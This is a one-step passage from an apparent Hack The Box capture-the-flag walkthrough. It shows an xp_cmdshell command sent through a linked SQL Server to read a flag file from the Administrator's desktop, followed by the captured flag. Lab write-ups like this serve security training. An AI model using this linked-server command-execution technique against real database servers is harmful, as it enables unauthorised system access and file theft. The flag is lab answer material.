## 12. Read the Flag

```sql
EXEC ('xp_cmdshell ''type C:\Users\Administrator\Desktop\flag.txt''') AT [LOCAL.TEST.LINKED.SRV]
```

Result:

```text
HTB{46u$!n9_l!nk3d_$3rv3r$}
```